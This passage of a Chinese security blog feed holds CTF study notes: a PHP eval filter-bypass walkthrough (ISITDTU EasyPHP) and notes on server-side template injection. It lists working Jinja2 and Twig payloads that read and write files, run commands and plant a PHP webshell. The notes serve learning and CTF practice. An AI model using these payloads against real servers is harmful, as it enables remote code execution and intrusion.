class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9_$]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>å…·ä½“å‚çœ‹ <a href="https://www.freebuf.com/articles/web/186298.html" target="_blank" rel="noopener">Pç¥çš„æ–‡ç« </a><br>ä»¥åŠ <a href="https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/" target="_blank" rel="noopener">å¾®ç¬‘å¸ˆå‚…çš„è¡ç”Ÿæ“ä½œ</a></p><h1 id="ISITDTU-CTF-2019-EasyPHP"><a href="#ISITDTU-CTF-2019-EasyPHP" class="headerlink" title="ISITDTU CTF 2019 EasyPHP"></a>ISITDTU CTF 2019 EasyPHP</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$_ = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9\'"`$&amp;.,|[&#123;_defgops\x7F]+/i'</span>, $_) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'rosÃ© will not do it'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'you are so close, omg'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>æœ‰ç‚¹ç±»ä¼¼ä»¥å‰å†™çš„å›½èµ›çš„ <a href="https://www.suk1.top/2019/05/16/love_math/" target="_blank" rel="noopener">love_math</a></p><p>æ­£åˆ™åŒ¹é…äº†ä¸€äº›å­—æ¯å’Œæ•°å­—è¿˜æœ‰ä¸€äº›ç‰¹æ®Šç¬¦å·ã€‚ å…·ä½“è°ƒè¯•æ­£åˆ™ è¿™é‡Œæœ‰ä¸ª<a href="https://regex101.com/" target="_blank" rel="noopener">å·¥å…·ç½‘ç«™</a></p><p>æ­£åˆ™çš„æ„æ€æ˜¯åŒ¹é… <code>\x00</code> åˆ° <code>ç©ºæ ¼(\x20)</code> çš„å­—ç¬¦ï¼Œ <code>0åˆ°9</code> çš„æ•°å­—ã€<code>&quot;$&amp;.,|[{_defgops</code> ä»¥åŠ <code>DELï¼ˆ\x7fï¼‰</code> å­—ç¬¦ã€‚å¦‚æœä½ æäº¤çš„å­—ç¬¦ä¸²å‡ºç°ä¸Šè¿°å­—ç¬¦ï¼Œdieã€‚</p><p>ç¬¬äºŒä¸ª<code>strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd</code><br>è¡¨ç¤ºæˆ‘ä»¬æäº¤çš„å­—ç¬¦ä¸²ä¸€å…±ä¸èƒ½å‡ºç°å¤šäº <strong>13ç§ä¸åŒçš„å­—ç¬¦</strong>ã€‚</p><p>å…è®¸å‡ºç°çš„å­—ç¬¦å¦‚ä¸‹ï¼š<code>!#%()*+-/:;&lt;=&gt;?</code><br><code>@ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz}~</code></p><h2 id="test-php"><a href="#test-php" class="headerlink" title="test.php"></a>test.php</h2><p>çœ‹ä¸€ä¸‹å†…ç½®å‡½æ•°è¿˜æœ‰å“ªäº›èƒ½ç”¨</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array=get_defined_functions();</span><br><span class="line"><span class="keyword">foreach</span>($array[<span class="string">'internal'</span>] <span class="keyword">as</span> $arr)&#123;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9\'"\`$&amp;.,|[&#123;_defgops\x7F]+/i'</span>, $arr) ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> ( strlen(count_chars(strtolower($arr), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">print</span>($arr.<span class="string">'&lt;br/&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">bcmul, rtrim, trim, ltrim</span><br><span class="line">chr, link, unlink, tan</span><br><span class="line">atan, atanh, tanh, intval</span><br><span class="line">mail, min, max</span><br></pre></td></tr></table></figure></div><p>è™½ç„¶å¼•å·éƒ½è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯PHPé»˜è®¤ä¼šæŠŠæ²¡æœ‰åŠ å¼•å·çš„å­—ç¬¦ä¸²å½“æˆå¸¸é‡å¤„ç†ï¼Œæ‰¾ä¸åˆ°å¯¹åº”å¸¸é‡å°±ä¼šå°†å…¶è§£é‡Šæˆå­—ç¬¦ä¸²ï¼Œå› æ­¤æ²¡æœ‰å¼•å·ä¸æ˜¯é™åˆ¶ã€‚</p><p>è€Œä¸”PHPè°ƒç”¨å‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²è°ƒç”¨ã€‚è¿™ä¸ªåœ¨å½“åˆ <a href="https://www.suk1.top/2020/02/05/GXY%E5%A5%97%E5%A8%83/" target="_blank" rel="noopener">GXYç¦æ­¢å¥—å¨ƒ</a> æœ‰æåˆ°è¿‡</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/limit_webshell_1.png" data-fancybox="group" data-caption="limit_webshell_1" class="fancybox"><img alt="limit_webshell_1" title="limit_webshell_1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/limit_webshell_1.png" class="lazyload"></a></p><p>æ³¨æ„åˆ° <code>^</code> ç¬¦å·æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å¯¹å­—ç¬¦ä¸²è¿›è¡Œè¿ç®—æ¥è§„é¿ifäº†ã€‚</p><p>åé¢å°±æ˜¯å¸¸è§„çš„å¼‚æˆ–è§£é¢˜</p><h2 id="ç›¸å…³çš„å‚è€ƒ"><a href="#ç›¸å…³çš„å‚è€ƒ" class="headerlink" title="ç›¸å…³çš„å‚è€ƒ"></a>ç›¸å…³çš„å‚è€ƒ</h2><p><a href="https://tiaonmmn.github.io/2019/07/18/ISITDTU-Easy-PHP/" target="_blank" rel="noopener">Tiaonmmn.ZMZå®˜æ–¹wp</a><br><a href="https://www.cnblogs.com/BOHB-yunying/p/11520031.html" target="_blank" rel="noopener">PHPä»£ç å®¡è®¡ï¼Œæ— å­—æ¯æ•°å­—webshell</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\yakko117\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\yakko117\assets\js\A
      
    
    </summary>
    
    
      <category term="å­¦ä¹ ç¬”è®°" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="çæ‰¯" scheme="https://manayakko.github.io/yakko117/tags/%E7%9E%8E%E6%89%AF/"/>
    
      <category term="code audit" scheme="https://manayakko.github.io/yakko117/tags/code-audit/"/>
    
  </entry>
  
  <entry>
    <title>SSTi æ¨¡æ¿æ³¨å…¥ç¬”è®°</title>
    <link href="https://manayakko.github.io/yakko117/2020/04/09/SSTi_learning/"/>
    <id>https://manayakko.github.io/yakko117/2020/04/09/SSTi_learning/</id>
    <published>2020-04-09T03:31:56.485Z</published>
    <updated>2020-04-13T01:41:01.208Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>å°å£°bbï¼Œæƒ³ç©FF7</p><h1 id="ä»€ä¹ˆæ˜¯SSTi"><a href="#ä»€ä¹ˆæ˜¯SSTi" class="headerlink" title="ä»€ä¹ˆæ˜¯SSTi"></a>ä»€ä¹ˆæ˜¯SSTi</h1><p><code>SSTi</code> å°±æ˜¯æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥<code>(Server-Side Template Injection)</code>ï¼Œä¹Ÿç»™å‡ºäº†ä¸€ä¸ªæ³¨å…¥çš„æ¦‚å¿µã€‚<br>å¸¸è§çš„æ³¨å…¥æœ‰ï¼šSQL æ³¨å…¥ï¼ŒXSS æ³¨å…¥ï¼ŒXPATH æ³¨å…¥ï¼ŒXML æ³¨å…¥ï¼Œä»£ç æ³¨å…¥ï¼Œå‘½ä»¤æ³¨å…¥ç­‰ç­‰ã€‚</p><p><code>SSTi</code> ä¹Ÿæ˜¯è·å–äº†ä¸€ä¸ªè¾“å…¥ï¼Œç„¶åå†åç«¯çš„æ¸²æŸ“å¤„ç†ä¸Šè¿›è¡Œäº†è¯­å¥çš„æ‹¼æ¥ï¼Œç„¶åæ‰§è¡Œã€‚å½“ç„¶è¿˜æ˜¯å’Œsqlæ³¨å…¥æœ‰æ‰€ä¸åŒçš„ï¼Œ<code>SSTi</code> åˆ©ç”¨çš„æ˜¯ç°åœ¨çš„ç½‘ç«™æ¨¡æ¿å¼•æ“(ä¸‹é¢ä¼šæåˆ°)ï¼Œä¸»è¦é’ˆå¯¹<code>python</code>ã€<code>php</code>ã€<code>java</code> çš„ä¸€äº›ç½‘ç«™å¤„ç†æ¡†æ¶ï¼Œæ¯”å¦‚<strong>Python</strong> çš„ <strong>jinja2 mako tornado django</strong>ï¼Œ<strong>Php</strong> çš„ <strong>smarty twig</strong>ï¼Œ<strong>Java</strong> çš„ <strong>jade velocity</strong>ã€‚å½“è¿™äº›æ¡†æ¶å¯¹è¿ç”¨æ¸²æŸ“å‡½æ•°ç”Ÿæˆhtmlçš„æ—¶å€™ä¼šå‡ºç° <code>SSTi</code> çš„é—®é¢˜ã€‚</p><p>ç°åœ¨ç½‘ä¸Šæèµ·çš„æ¯”è¾ƒå¤šçš„æ˜¯Pythonçš„ç½‘ç«™ã€‚</p><h2 id="æ¨¡æ¿å¼•æ“"><a href="#æ¨¡æ¿å¼•æ“" class="headerlink" title="æ¨¡æ¿å¼•æ“"></a>æ¨¡æ¿å¼•æ“</h2><p><strong>æ¨¡æ¿å¼•æ“</strong> (è¿™é‡Œç‰¹æŒ‡ç”¨äºWebå¼€å‘çš„æ¨¡æ¿å¼•æ“)</p><ul><li>æ˜¯ä¸ºäº†ä½¿ç”¨æˆ·ç•Œé¢ä¸ä¸šåŠ¡æ•°æ®ï¼ˆå†…å®¹ï¼‰åˆ†ç¦»è€Œäº§ç”Ÿçš„ï¼Œå®ƒå¯ä»¥ç”Ÿæˆç‰¹å®šæ ¼å¼çš„æ–‡æ¡£ï¼Œç”¨äºç½‘ç«™çš„æ¨¡æ¿å¼•æ“å°±ä¼šç”Ÿæˆä¸€ä¸ªæ ‡å‡†çš„HTMLæ–‡æ¡£ã€‚</li><li>å¯ä»¥è®©ï¼ˆç½‘ç«™ï¼‰ç¨‹åºå®ç°ç•Œé¢ä¸æ•°æ®åˆ†ç¦»,ä¸šåŠ¡ä»£ç ä¸é€»è¾‘ä»£ç çš„åˆ†ç¦»ï¼Œè¿™å°±å¤§å¤§æå‡äº†å¼€å‘æ•ˆç‡ï¼Œè‰¯å¥½çš„è®¾è®¡ä¹Ÿä½¿å¾—ä»£ç é‡ç”¨å˜å¾—æ›´åŠ å®¹æ˜“ã€‚</li></ul><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œåˆ©ç”¨ <strong>æ¨¡æ¿å¼•æ“</strong> æ¥ç”Ÿæˆå‰ç«¯çš„ <code>htmlä»£ç </code>ï¼Œæ¨¡æ¿å¼•æ“ä¼šæä¾›ä¸€å¥—ç”Ÿæˆhtmlä»£ç çš„ç¨‹åºï¼Œç„¶ååªéœ€è¦è·å–ç”¨æˆ·çš„æ•°æ®ï¼Œç„¶åæ”¾åˆ°æ¸²æŸ“å‡½æ•°é‡Œï¼Œç„¶åç”Ÿæˆ <code>æ¨¡æ¿+ç”¨æˆ·æ•°æ®</code>çš„ <code>å‰ç«¯htmlé¡µé¢</code>ï¼Œç„¶ååé¦ˆç»™æµè§ˆå™¨ï¼Œå‘ˆç°åœ¨ç”¨æˆ·é¢å‰ã€‚</p><p>æ¨¡æ¿å¼•æ“ä¹Ÿä¼šæä¾›æ²™ç®±æœºåˆ¶æ¥è¿›è¡Œæ¼æ´é˜²èŒƒï¼Œä½†æ˜¯å¯ä»¥ç”¨æ²™ç®±é€ƒé€¸æŠ€æœ¯æ¥è¿›è¡Œç»•è¿‡ã€‚</p><h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exec webshell1</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("id").read()'</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># exec webshell2</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("id").read()'</span>) &#125;&#125; </span><br><span class="line">    <span class="comment"># poppençš„å‚æ•°å°±æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤</span></span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–åŸºæœ¬ç±»</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">object</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»æ–‡ä»¶</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r'C:\1.php'</span>).read()</span><br><span class="line">object.__subclasses__()[<span class="number">40</span>](<span class="string">r'C:\1.php'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™æ–‡ä»¶</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/input'</span>, <span class="string">'w'</span>).write(<span class="string">'123'</span>)</span><br><span class="line">object.__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/input'</span>, <span class="string">'w'</span>).write(<span class="string">'123'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰§è¡Œä»»æ„å‘½ä»¤</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls  /var/www/html").read()'</span> )</span><br><span class="line">object.__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls  /var/www/html").read()'</span> )</span><br></pre></td></tr></table></figure></div><h2 id="TWIG-å…¨ç‰ˆæœ¬-é€šç”¨-SSTI-payload"><a href="#TWIG-å…¨ç‰ˆæœ¬-é€šç”¨-SSTI-payload" class="headerlink" title="TWIG å…¨ç‰ˆæœ¬ é€šç”¨ SSTI payload"></a>TWIG å…¨ç‰ˆæœ¬ é€šç”¨ SSTI payload</h2><p><a href="https://xz.aliyun.com/t/7518" target="_blank" rel="noopener">å‚è€ƒæ–‡æ¡£</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">"id"</span>]|map(<span class="string">"system"</span>)|join(<span class="string">","</span>)</span><br><span class="line">&#123;&#123;[<span class="string">"id"</span>, <span class="number">0</span>]|sort(<span class="string">"system"</span>)|join(<span class="string">","</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">"id"</span>]|filter(<span class="string">"system"</span>)|join(<span class="string">","</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|reduce(<span class="string">"system"</span>, <span class="string">"id"</span>)|join(<span class="string">","</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;<span class="string">"&lt;?php phpinfo();"</span>:<span class="string">"/var/www/html/shell.php"</span>&#125;|map(<span class="string">"file_put_contents"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></div><h2 id="éœ€è¦äº†è§£çš„ä¸€äº›ä¸œè¥¿"><a href="#éœ€è¦äº†è§£çš„ä¸€äº›ä¸œè¥¿" class="headerlink" title="éœ€è¦äº†è§£çš„ä¸€äº›ä¸œè¥¿"></a>éœ€è¦äº†è§£çš„ä¸€äº›ä¸œè¥¿</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__</span><br><span class="line">&lt;type <span class="string">'str'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…ƒç»„</span></span><br><span class="line">&lt;type <span class="string">'tuple'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ—è¡¨</span></span><br><span class="line">&lt;type <span class="string">'list'</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># å­—å…¸</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__</span><br><span class="line">&lt;type <span class="string">'dict'</span>&gt;</span><br></pre></td></tr></table></figure></div><p><strong>_<em>class_</em></strong> ï¼šç”¨æ¥æŸ¥çœ‹å˜é‡æ‰€å±çš„ç±»ï¼Œæ ¹æ®å‰é¢çš„å˜é‡å½¢å¼å¯ä»¥å¾—åˆ°å…¶æ‰€å±çš„ç±»ã€‚</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__</span><br><span class="line">(&lt;type <span class="string">'object'</span>&gt;,)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__bases__</span><br><span class="line">(&lt;type <span class="string">'basestring'</span>&gt;,)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__bases__</span><br><span class="line">(&lt;type <span class="string">'object'</span>&gt;,)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__.__bases__</span><br><span class="line">(&lt;type <span class="string">'object'</span>&gt;,)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;type <span class="string">'object'</span>&gt;</span><br></pre></td></tr></table></figure></div><p><strong>_<em>bases_</em></strong> ï¼šç”¨æ¥æŸ¥çœ‹ç±»çš„åŸºç±»ï¼Œä¹Ÿå¯æ˜¯ä½¿ç”¨æ•°ç»„ç´¢å¼•æ¥æŸ¥çœ‹ç‰¹å®šä½ç½®çš„å€¼</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div></div><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">[&lt;type <span class="string">'type'</span>&gt;, &lt;type <span class="string">'weakref'</span>&gt;, &lt;type <span class="string">'weakcallableproxy'</span>&gt;, &lt;type <span class="string">'weakproxy'</span>&gt;,</span><br><span class="line"> &lt;type <span class="string">'int'</span>&gt;, &lt;type <span class="string">'basestring'</span>&gt;, &lt;type <span class="string">'bytearray'</span>&gt;, &lt;type <span class="string">'list'</span>&gt;, &lt;type <span class="string">'NoneType'</span>&gt;, </span><br><span class="line"> &lt;type <span class="string">'NotImplementedType'</span>&gt;, &lt;type <span class="string">'traceback'</span>&gt;, &lt;type <span class="string">'super'</span>&gt;, &lt;type <span class="string">'xrange'</span>&gt;, </span><br><span class="line"> &lt;type <span class="string">'dict'</span>&gt;, &lt;type <span class="string">'set'</span>&gt;, &lt;type <span class="string">'slice'</span>&gt;, &lt;type <span class="string">'staticmethod'</span>&gt;, &lt;type <span class="string">'complex'</span>&gt;, </span><br><span class="line"> &lt;type <span class="string">'float'</span>&gt;, &lt;type <span class="string">'buffer'</span>&gt;, &lt;type <span class="string">'long'</span>&gt;, &lt;type <span class="string">'frozenset'</span>&gt;, &lt;type <span class="string">'property'</span>&gt;, </span><br><span class="line"> &lt;type <span class="string">'memoryview'</span>&gt;, &lt;type <span class="string">'tuple'</span>&gt;, &lt;type <span class="string">'enumerate'</span>&gt;, &lt;type <span class="string">'reversed'</span>&gt;, &lt;type <span class="string">'code'</span>&gt;, </span><br><span class="line"> &lt;type <span class="string">'frame'</span>&gt;, &lt;type <span class="string">'builtin_function_or_method'</span>&gt;, &lt;type <span class="string">'instancemethod'</span>&gt;,</span><br><span class="line">  &lt;type <span class="string">'function'</span>&gt;, &lt;type <span class="string">'classobj'</span>&gt;, &lt;type <span class="string">'dictproxy'</span>&gt;, &lt;type <span class="string">'generator'</span>&gt;,</span><br><span class="line">    &lt;type <span class="string">'getset_descriptor'</span>&gt;, &lt;type <span class="string">'wrapper_descriptor'</span>&gt;, &lt;type <span class="string">'instance'</span>&gt;, &lt;type <span class="string">'ellipsis'</span>&gt;,</span><br><span class="line">    &lt;type <span class="string">'member_descriptor'</span>&gt;, &lt;type <span class="string">'file'</span>&gt;, &lt;type <span class="string">'PyCapsule'</span>&gt;, &lt;type <span class="string">'cell'</span>&gt;, </span><br><span class="line">    &lt;type 'callable-iterator'&gt;, &lt;type 'iterator'&gt;, &lt;type 'sys.long_info'&gt;, &lt;type 'sys.float_info'&gt;, &lt;type 'EncodingMap'&gt;, &lt;type 'fieldnameiterator'&gt;, &lt;type 'formatteriterator'&gt;, &lt;type 'sys.version_info'&gt;, &lt;type 'sys.flags'&gt;, &lt;type 'sys.getwindowsversion'&gt;, &lt;type 'exceptions.BaseException'&gt;, &lt;type 'module'&gt;, &lt;type 'imp.NullImporter'&gt;, &lt;type 'zipimport.zipimporter'&gt;, &lt;type 'nt.stat_result'&gt;, &lt;type 'nt.statvfs_result'&gt;, &lt;class 'warnings.WarningMessage'&gt;, 